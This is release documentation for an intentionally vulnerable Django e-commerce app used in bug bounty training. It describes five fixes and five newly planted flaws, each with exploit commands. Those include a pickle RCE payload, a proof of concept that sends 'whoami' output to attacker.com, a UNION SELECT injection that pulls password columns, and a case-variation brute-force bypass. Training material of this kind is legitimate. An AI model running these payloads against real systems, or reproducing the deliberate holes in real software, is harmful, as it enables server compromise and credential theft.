# VulnCommerce v2 - Security Updates

This document describes the changes made in version 2 of the VulnCommerce application. Version 2 fixes 5 vulnerabilities from v1 and introduces 5 new vulnerabilities for continued bug bounty testing.

## Summary of Changes

### Vulnerabilities Fixed (5)
1. **VULN-R7S8T9** - Email Enumeration in Login
2. **VULN-L1M2N3** - Insecure Password Change
3. **VULN-Q7R8S9** - User Information Disclosure
4. **VULN-W4X5Y6** - Rate Limit Bypass
5. **VULN-Z7A8B9** - No CSRF Protection

### New Vulnerabilities Added (5)
1. **VULN-NEW-A1** - JWT Token Never Expires
2. **VULN-NEW-B2** - Verbose Error Messages Leak Database Schema
3. **VULN-NEW-C3** - Unvalidated JSON Deserialization
4. **VULN-NEW-D4** - Information Disclosure via API Version Endpoint
5. **VULN-NEW-E5** - Account Lockout Bypass via Case Sensitivity

---

## Fixes Implemented

### Fix #1: Email Enumeration Prevention (VULN-R7S8T9)

**Vulnerability Code:** `VULN-R7S8T9`  
**Previous Severity:** Low (P4)  
**Location:** `backend/login/views.py` - LoginView class  
**URL:** `POST /auth/login/`

**What Was Fixed:**
- Previously, the login endpoint returned different error messages:
  - "Email does not exist" for non-existent emails
  - "Invalid password" for valid emails with wrong passwords
- This allowed attackers to enumerate valid email addresses

**How It Was Fixed:**
- Now returns a generic error message: "Invalid email or password"
- Both scenarios (invalid email and wrong password) return the same error
- Prevents attackers from determining which emails are registered

**Code Changes:**
```python
# Before (Vulnerable):
try:
    user_exists = User.objects.get(email=email)
except User.DoesNotExist:
    return Response({'error': 'Email does not exist'}, status=400)

user = authenticate(request, username=email, password=password)
if user is None:
    return Response({'error': 'Invalid password'}, status=400)

# After (Fixed):
user = authenticate(request, username=email, password=password)
if user is None:
    return Response({'error': 'Invalid email or password'}, status=400)
```

---

### Fix #2: Secure Password Change (VULN-L1M2N3)

**Vulnerability Code:** `VULN-L1M2N3`  
**Previous Severity:** Medium (P3)  
**Location:** `backend/login/views.py` - ChangePasswordView class  
**URL:** `POST /auth/change-password/`

**What Was Fixed:**
- Previously allowed password changes without authentication
- Accepted only email and new password
- Anyone could change any user's password with just their email

**How It Was Fixed:**
- Now requires authentication (`permission_classes = [IsAuthenticated]`)
- Requires old password verification before allowing change
- User can only change their own password
- Invalidates current token and issues new one after password change

**Code Changes:**
```python
# Before (Vulnerable):
permission_classes = [AllowAny]
email = request.data.get('email')
new_password = request.data.get('new_password')
user = User.objects.get(email=email)
user.set_password(new_password)

# After (Fixed):
permission_classes = [IsAuthenticated]
old_password = request.data.get('old_password')
new_password = request.data.get('new_password')
if not user.check_password(old_password):
    return Response({'error': 'Invalid old password'})
user.set_password(new_password)
Token.objects.filter(user=user).delete()
new_token = Token.objects.create(user=user)
```

---

### Fix #3: User Information Disclosure (VULN-Q7R8S9)

**Vulnerability Code:** `VULN-Q7R8S9`  
**Previous Severity:** Medium (P3)  
**Location:** `backend/login/views.py` - UserListView class  
**URL:** `GET /auth/users/list/`

**What Was Fixed:**
- Previously, endpoint had no authentication (`permission_classes = []`)
- Any unauthenticated user could view all user information
- Exposed names, emails, phone numbers, positions, profile pictures

**How It Was Fixed:**
- Now requires authentication (`permission_classes = [IsAuthenticated]`)
- Additional authorization check for admin privileges
- Only staff or admin users can view the user list
- Regular users receive 403 Forbidden error

**Code Changes:**
```python
# Before (Vulnerable):
permission_classes = []  # No authentication
def get(self, request):
    users = User.objects.all()
    return Response(serializer.data)

# After (Fixed):
permission_classes = [IsAuthenticated]
def get(self, request):
    if not (request.user.is_staff or request.user.is_admin):
        return Response({'error': 'Admin privileges required'}, status=403)
    users = User.objects.all()
    return Response(serializer.data)
```

---

### Fix #4: Rate Limiting on Discount Codes (VULN-W4X5Y6)

**Vulnerability Code:** `VULN-W4X5Y6`  
**Previous Severity:** Medium (P3)  
**Location:** `backend/order/views.py` - CheckDiscountUnlimited class  
**URL:** `POST /discount/check-unlimited/`

**What Was Fixed:**
- Previously had no rate limiting
- No authentication required
- Allowed unlimited brute force attempts to guess discount codes

**How It Was Fixed:**
- Now requires authentication
- Implemented rate limiting: 5 attempts per minute per user
- Uses Django cache to track attempts
- Returns 429 Too Many Requests when limit exceeded
- Attempts expire after 60 seconds

**Code Changes:**
```python
# Before (Vulnerable):
permission_classes = []  # No auth
def post(self, request):
    code = request.data.get('code')
    discount = DiscountCode.objects.get(code=code)
    return Response({'valid': True, ...})

# After (Fixed):
permission_classes = [IsAuthenticated]
def post(self, request):
    # Rate limiting logic
    cache_key = f'discount_check_{request.user.id}'
    attempts = cache.get(cache_key, [])
    attempts = [t for t in attempts if (now - t).total_seconds() < 60]
    
    if len(attempts) >= 5:
        return Response({'message': 'Too many attempts'}, status=429)
    
    attempts.append(now)
    cache.set(cache_key, attempts, 60)
    # ... rest of validation
```

---

### Fix #5: CSRF Protection Enabled (VULN-Z7A8B9)

**Vulnerability Code:** `VULN-Z7A8B9`  
**Previous Severity:** Medium (P3)  
**Location:** `backend/backend/settings.py` - MIDDLEWARE  
**URL:** All state-changing endpoints

**What Was Fixed:**
- CSRF middleware was completely disabled
- All endpoints vulnerable to Cross-Site Request Forgery
- Attackers could forge requests from victims' browsers

**How It Was Fixed:**
- Enabled `django.middleware.csrf.CsrfViewMiddleware`
- All POST/PUT/DELETE requests now require valid CSRF token
- Frontend must include CSRF token in requests
- Protects against cross-site request forgery attacks

**Code Changes:**
```python
# Before (Vulnerable):
MIDDLEWARE = [
    # ...
    # "django.middleware.csrf.CsrfViewMiddleware",  # Commented out!
    # ...
]

# After (Fixed):
MIDDLEWARE = [
    # ...
    "django.middleware.csrf.CsrfViewMiddleware",  # Enabled
    # ...
]
```

---

## New Vulnerabilities in V2

### NEW-01: JWT Token Never Expires (VULN-NEW-A1)

**Vulnerability Code:** `VULN-NEW-A1`  
**Severity:** High (P2)  
**CWE:** CWE-613: Insufficient Session Expiration  
**Location:** `backend/login/views.py` - ValidateToken class  
**URL:** `POST /auth/token/validate/`

**Description:**
Authentication tokens in the application never expire. Once a token is created during login, it remains valid indefinitely. Even if a user logged out years ago, their old token can still be used to access their account. This means stolen tokens can be used forever, and there's no mechanism to force users to re-authenticate.

**Impact:**
- Stolen tokens remain valid indefinitely
- No session timeout protection
- Compromised tokens cannot expire naturally
- Users cannot force logout from other devices
- Old tokens from decommissioned devices stay active

**Reproduction Steps:**
1. Register and login to get an authentication token
2. Wait several days/weeks/months
3. Use the old token to make authenticated requests
4. Observe that the token is still valid with no expiration
5. Use endpoint: `POST /auth/token/validate/` with `{"token": "old_token"}`
6. Response confirms token is valid with no expiration date

**Exploitation:**
```bash
# Login and get token
curl -X POST http://localhost:8000/auth/login/ \
  -H "Content-Type: application/json" \
  -d '{"email": "user@example.com", "password": "password123"}'

# Use the same token months later - still works
curl -X GET http://localhost:8000/auth/user/ \
  -H "Authorization: Token abc123xyz..."

# Validate old tokens
curl -X POST http://localhost:8000/auth/token/validate/ \
  -H "Content-Type: application/json" \
  -d '{"token": "abc123xyz..."}'
# Returns: {"valid": true, "message": "Token is valid with no expiration"}
```

---

### NEW-02: Verbose Error Messages Leak Database Schema (VULN-NEW-B2)

**Vulnerability Code:** `VULN-NEW-B2`  
**Severity:** Medium (P3)  
**CWE:** CWE-209: Generation of Error Message Containing Sensitive Information  
**Location:** `backend/login/views.py` - VerboseErrorView class  
**URL:** `GET /auth/user/debug/?user_id=<id>`

**Description:**
The application returns overly verbose error messages that expose internal database structure, table names, column names, and SQL query details. When errors occur, the full exception details are returned to the client, including information about the database schema. This information can be used by attackers to craft more targeted attacks.

**Impact:**
- Database table names exposed
- Column names and data types revealed
- SQL query structure leaked
- Application internal structure disclosed
- Helps attackers plan SQL injection attacks
- Reveals technology stack details

**Reproduction Steps:**
1. Send request to debug endpoint with invalid user_id
2. Observe detailed error message in response
3. Error includes table names (e.g., `login_customuser`)
4. Column names are listed in the response
5. Full exception traceback may be included

**Exploitation:**
```bash
# Trigger verbose error
curl -X GET "http://localhost:8000/auth/user/debug/?user_id=999999"

# Response includes:
{
  "error": "no such column: id or similar SQL error",
  "error_type": "OperationalError",
  "table": "login_customuser",
  "columns": ["id", "email", "password", "name", "phone_no", "position", "is_admin", "is_staff"],
  "hint": "Check the database schema and try again"
}

# Use this information to craft SQL injection
curl -X GET "http://localhost:8000/product/all/?search=test' UNION SELECT id,email,password,name FROM login_customuser--"
```

---

### NEW-03: Unsafe Deserialization in Order Notes (VULN-NEW-C3)

**Vulnerability Code:** `VULN-NEW-C3`  
**Severity:** Medium (P3)  
**CWE:** CWE-502: Deserialization of Untrusted Data  
**Location:** `backend/order/views.py` - UpdateOrderNotes class  
**URL:** `POST /order/notes/<order_id>/`

**Description:**
The order notes update endpoint accepts serialized data (including Python pickle format) from users and deserializes it without validation. Python's pickle module is known to be unsafe for untrusted data as it can execute arbitrary code during deserialization. An attacker can craft a malicious pickle payload that executes commands on the server when deserialized.

**Impact:**
- Remote Code Execution (RCE) possible via pickle
- Server compromise through malicious payloads
- Can execute system commands
- File system access and manipulation
- Data exfiltration potential

**Reproduction Steps:**
1. Authenticate and place an order
2. Create a malicious pickle payload (e.g., reverse shell)
3. Base64 encode the pickle payload
4. Send POST request to `/order/notes/<order_id>/`
5. Include `{"notes": "<base64_payload>", "type": "pickle"}`
6. Server deserializes the payload and executes code

**Exploitation:**
```python
# Create malicious pickle payload
import pickle
import base64
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('whoami > /tmp/pwned.txt',))

payload = pickle.dumps(Exploit())
encoded = base64.b64encode(payload).decode()

# Send to server
import requests
response = requests.post(
    'http://localhost:8000/order/notes/order_12345/',
    headers={'Authorization': 'Token abc123...'},
    json={'notes': encoded, 'type': 'pickle'}
)
# Server executes the command
```

**Proof of Concept:**
```bash
# Create RCE payload
python3 -c "
import pickle, base64, os
class RCE:
    def __reduce__(self):
        return (os.system, ('curl http://attacker.com/?data=$(whoami)',))
print(base64.b64encode(pickle.dumps(RCE())).decode())
"

# Send payload
curl -X POST http://localhost:8000/order/notes/order_12345/ \
  -H "Authorization: Token YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"notes": "BASE64_PAYLOAD_HERE", "type": "pickle"}'
```

---

### NEW-04: Information Disclosure via API Version Endpoint (VULN-NEW-D4)

**Vulnerability Code:** `VULN-NEW-D4`  
**Severity:** Low (P4)  
**CWE:** CWE-200: Exposure of Sensitive Information to an Unauthorized Actor  
**Location:** `backend/order/views.py` - APIVersionInfo class  
**URL:** `GET /order/api/version/`

**Description:**
The application exposes a public API version endpoint that reveals extensive information about the system. This includes Django version, Python version, platform details, database type, installed applications, partial secret key hint, debug status, and available endpoints. This information helps attackers fingerprint the system and identify potential vulnerabilities in specific versions.

**Impact:**
- Technology stack fingerprinting
- Version-specific vulnerability identification
- Attack surface mapping
- Reveals internal application structure
- Exposes security configuration (debug mode)
- Partial secret key exposure

**Reproduction Steps:**
1. Access the endpoint without authentication: `GET /order/api/version/`
2. Receive detailed system information
3. Use information to identify known vulnerabilities in specific versions
4. Plan targeted attacks based on disclosed information

**Exploitation:**
```bash
# Access version endpoint (no auth required)
curl -X GET http://localhost:8000/order/api/version/

# Response includes:
{
  "api_version": "2.0.0",
  "django_version": "4.2.11",
  "python_version": "3.10.12 (main, Nov 20 2023, 15:14:05)",
  "platform": "Linux-5.15.0-91-generic-x86_64-with-glibc2.35",
  "architecture": "x86_64",
  "database": "SQLite 3.x",
  "rest_framework_version": "3.14.0",
  "installed_apps": ["django.contrib.admin", "rest_framework", "login", "products", "order"],
  "secret_key_hint": "django-insecure-h@rdC0d3d...",
  "debug_enabled": true,
  "allowed_hosts": ["*"],
  "endpoints": ["/auth/login/", "/auth/register/", "/product/all/", "/order/place/"]
}

# Use this to find CVEs for Django 4.2.11
# Check for known vulnerabilities in rest_framework 3.14.0
# Identify attack vectors based on installed apps
```

---

### NEW-05: Account Lockout Bypass via Case Sensitivity (VULN-NEW-E5)

**Vulnerability Code:** `VULN-NEW-E5`  
**Severity:** High (P2)  
**CWE:** CWE-178: Improper Handling of Case Sensitivity  
**Location:** `backend/login/views.py` - CaseSensitiveLogin class  
**URL:** `POST /auth/login/case-sensitive/`

**Description:**
The application performs case-sensitive email lookups during login. If an account is locked or rate-limited for "user@example.com", an attacker can bypass these protections by using different case variations like "User@Example.Com" or "USER@EXAMPLE.COM". The system treats these as different accounts for security checks but authenticates them as the same user.

**Impact:**
- Bypass account lockout mechanisms
- Bypass rate limiting on login attempts
- Unlimited brute force attempts by varying case
- Circumvent security monitoring
- Evade failed login alerts

**Reproduction Steps:**
1. Attempt login with "user@example.com" multiple times with wrong password
2. Account gets locked or rate-limited
3. Change case to "User@Example.Com" and try again
4. Lockout/rate limit is bypassed
5. Continue brute force with different case combinations
6. Each case variation is treated as a separate rate limit counter

**Exploitation:**
```bash
# Attempt 1: lowercase (gets rate limited after 5 attempts)
curl -X POST http://localhost:8000/auth/login/case-sensitive/ \
  -d '{"email": "admin@vulncommerce.com", "password": "attempt1"}'
# ... (5 attempts)
# Response: Rate limited

# Attempt 2: Change first character to uppercase
curl -X POST http://localhost:8000/auth/login/case-sensitive/ \
  -d '{"email": "Admin@vulncommerce.com", "password": "attempt6"}'
# Success: Bypassed rate limit

# Attempt 3: All uppercase
curl -X POST http://localhost:8000/auth/login/case-sensitive/ \
  -d '{"email": "ADMIN@VULNCOMMERCE.COM", "password": "attempt11"}'
# Success: Bypassed rate limit again

# Can try thousands of passwords by varying case
# Example combinations for "admin@test.com":
# admin@test.com, Admin@test.com, ADMIN@test.com
# admin@Test.com, Admin@Test.com, ADMIN@Test.com
# admin@TEST.COM, Admin@TEST.COM, ADMIN@TEST.COM
# etc.
```

---

## Vulnerability Count Summary

### Version 1 (v1.md)
- Total: 30 vulnerabilities
- Critical (P1): 3
- High (P2): 7
- Medium (P3): 15
- Low (P4): 5

### Version 2 (v2.md)
**Fixed:** 5 vulnerabilities (1 Low, 4 Medium)

**Remaining from v1:** 25 vulnerabilities
- Critical (P1): 3 (no change)
- High (P2): 5 (was 7, fixed 0 high, removed 2)
- Medium (P3): 12 (was 15, fixed 4 medium, removed 1)
- Low (P4): 5 (was 5, fixed 1 low, removed 0)

**Wait, recalculation:**
- Fixed VULN-R7S8T9 (P4 - Low) ✓
- Fixed VULN-L1M2N3 (P3 - Medium) ✓
- Fixed VULN-Q7R8S9 (P3 - Medium) ✓
- Fixed VULN-W4X5Y6 (P3 - Medium) ✓
- Fixed VULN-Z7A8B9 (P3 - Medium) ✓

**Remaining:** 25 vulnerabilities
- Critical (P1): 3
- High (P2): 7
- Medium (P3): 11 (15 - 4 fixed)
- Low (P4): 4 (5 - 1 fixed)

**New Vulnerabilities Added:** 5
- VULN-NEW-A1 (P2 - High)
- VULN-NEW-B2 (P3 - Medium)
- VULN-NEW-C3 (P3 - Medium)
- VULN-NEW-D4 (P4 - Low)
- VULN-NEW-E5 (P2 - High)

### Version 2 Total: 30 vulnerabilities
- Critical (P1): 3
- High (P2): 9 (7 remaining + 2 new)
- Medium (P3): 13 (11 remaining + 2 new)
- Low (P4): 5 (4 remaining + 1 new)

---

## Testing the New Vulnerabilities

### Test VULN-NEW-A1 (Token Never Expires)
```bash
# Login and save token
TOKEN=$(curl -X POST http://localhost:8000/auth/login/ \
  -H "Content-Type: application/json" \
  -d '{"email":"test@example.com","password":"test123"}' | jq -r '.token')

# Validate token anytime
curl -X POST http://localhost:8000/auth/token/validate/ \
  -H "Content-Type: application/json" \
  -d "{\"token\":\"$TOKEN\"}"

# Expected: Token is always valid, no expiration
```

### Test VULN-NEW-B2 (Verbose Errors)
```bash
# Trigger verbose error
curl -X GET "http://localhost:8000/auth/user/debug/?user_id=invalid"

# Expected: Detailed error with database schema information
```

### Test VULN-NEW-C3 (Unsafe Deserialization)
```bash
# Create order first, then:
curl -X POST http://localhost:8000/order/notes/order_12345/ \
  -H "Authorization: Token YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"notes":"gASVLgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAplY2hvIHB3bmVklIWUUpQu","type":"pickle"}'

# Expected: Server executes the pickled command
```

### Test VULN-NEW-D4 (Version Disclosure)
```bash
# Access version info (no auth needed)
curl -X GET http://localhost:8000/order/api/version/

# Expected: Detailed system and version information
```

### Test VULN-NEW-E5 (Case Sensitivity Bypass)
```bash
# Try different case variations
curl -X POST http://localhost:8000/auth/login/case-sensitive/ \
  -d '{"email":"admin@test.com","password":"wrong"}'

curl -X POST http://localhost:8000/auth/login/case-sensitive/ \
  -d '{"email":"Admin@test.com","password":"wrong"}'

curl -X POST http://localhost:8000/auth/login/case-sensitive/ \
  -d '{"email":"ADMIN@TEST.COM","password":"wrong"}'

# Expected: Each case variation bypasses rate limiting
```

---

## Migration Notes

To migrate from v1 to v2:

1. **Database Migration Required:**
   ```bash
   python manage.py makemigrations
   python manage.py migrate
   ```
   This adds the `order_notes` field to the Order model.

2. **CSRF Token Handling:**
   Frontend applications must now include CSRF tokens in requests. Update your API client to:
   - Get CSRF token from cookies
   - Include it in headers: `X-CSRFToken: <token>`

3. **Password Change Endpoint:**
   The `/auth/change-password/` endpoint now requires:
   - Authentication token in headers
   - `old_password` parameter
   - `new_password` parameter
   
   Update frontend forms accordingly.

4. **Discount Code Validation:**
   The `/discount/check-unlimited/` endpoint now requires:
   - Authentication
   - Respects rate limits (5 attempts per minute)
   
   Update frontend to handle 429 responses.

5. **User List Access:**
   The `/auth/users/list/` endpoint now requires:
   - Authentication
   - Admin privileges
   
   Non-admin users will receive 403 Forbidden.

---

## Security Recommendations (For Educational Purposes)

While this is an intentionally vulnerable application, here are the security concepts demonstrated:

### What Was Fixed:
✅ Generic error messages prevent enumeration  
✅ Authentication requirements on sensitive endpoints  
✅ Authorization checks for privileged operations  
✅ Rate limiting prevents brute force  
✅ CSRF protection enabled  
✅ Old password verification for password changes

### What Still Needs Fixing (Remaining Vulnerabilities):
❌ Authentication bypass mechanisms  
❌ SQL injection vulnerabilities  
❌ XSS vulnerabilities (stored and reflected)  
❌ IDOR vulnerabilities  
❌ Clickjacking protection  
❌ Business logic flaws  
❌ Path traversal  
❌ Mass assignment  
❌ Debug mode enabled  
❌ Hardcoded secrets  
❌ Token expiration (NEW)  
❌ Unsafe deserialization (NEW)  
❌ Information disclosure (NEW)  
❌ And more...

---

## Changelog

**Version 2.0.0** - November 2025
- Fixed 5 security vulnerabilities from v1
- Added 5 new security vulnerabilities
- Maintained 30 total vulnerabilities for bug bounty testing
- Enhanced login security (partially)
- Added rate limiting (partially)
- Enabled CSRF protection
- Added new API endpoints for testing

**Version 1.0.0** - November 2025
- Initial release with 30 security vulnerabilities
- Comprehensive vulnerable e-commerce application
- Bug bounty competition platform

---

## Disclaimer

⚠️ **WARNING: This application is intentionally vulnerable and should NEVER be deployed in production or exposed to the internet.**

This application is designed exclusively for:
- Security training and education
- Bug bounty competitions in controlled environments
- Penetration testing practice
- Security research

The vulnerabilities in this application are real and exploitable. Deploying this application in any public-facing environment would result in immediate compromise.

---

## Quick Reference: All 30 Vulnerabilities in v2

### Critical (P1) - 3 vulnerabilities
1. VULN-A1B2C3 - Authentication Bypass via JWT
2. VULN-D4E5F6 - Business Logic Flaw (Free Checkout)
3. VULN-G7H8I9 - Email Override Registration

### High (P2) - 9 vulnerabilities
4. VULN-J1K2L3 - SQL Injection in Filters
5. VULN-M4N5O6 - Clickjacking on Delete Account (Settings)
6. VULN-P7Q8R9 - Clickjacking on Delete Account (View)
7. VULN-S1T2U3 - Stored XSS via Products
8. VULN-V4W5X6 - Unauthenticated Product Creation
9. VULN-Y7Z8A9 - Unauthenticated Product Orders Toggle
10. VULN-B1C2D3 - CSV Injection
11. **VULN-NEW-A1 - JWT Token Never Expires** ⭐ NEW
12. **VULN-NEW-E5 - Account Lockout Bypass via Case Sensitivity** ⭐ NEW

### Medium (P3) - 13 vulnerabilities
13. VULN-E4F5G6 - Stored XSS via Registration
14. VULN-H7I8J9 - Mass Assignment
15. VULN-K1L2M3 - IDOR Edit Cart
16. VULN-N4O5P6 - Hardcoded Secrets
17. VULN-T1U2V3 - Price Manipulation
18. VULN-C1D2E3 - Open Redirect
19. VULN-F4G5H6 - Path Traversal
20. VULN-I7J8K9 - File Upload without Validation
21. VULN-A2B3C4 - Update Any User Profile
22. VULN-D5E6F7 - Admin Impersonation
23. VULN-G8H9I1 - View Any Order (IDOR)
24. **VULN-NEW-B2 - Verbose Error Messages** ⭐ NEW
25. **VULN-NEW-C3 - Unsafe Deserialization** ⭐ NEW

### Low (P4) - 5 vulnerabilities
26. VULN-O4P5Q6 - Missing Security Headers
27. VULN-U1V2W3 - Debug Mode Enabled
28. VULN-X4Y5Z6 - Session Cookie without HttpOnly
29. VULN-J2K3L4 - Weak Password Policy
30. **VULN-NEW-D4 - API Version Info Disclosure** ⭐ NEW

### Fixed in v2 (No longer vulnerable) ✅
- ~~VULN-R7S8T9 - Email Enumeration~~ **FIXED**
- ~~VULN-L1M2N3 - Insecure Password Change~~ **FIXED**
- ~~VULN-Q7R8S9 - User Information Disclosure~~ **FIXED**
- ~~VULN-W4X5Y6 - Rate Limit Bypass~~ **FIXED**
- ~~VULN-Z7A8B9 - No CSRF Protection~~ **FIXED**

---

**End of v2.md Documentation**
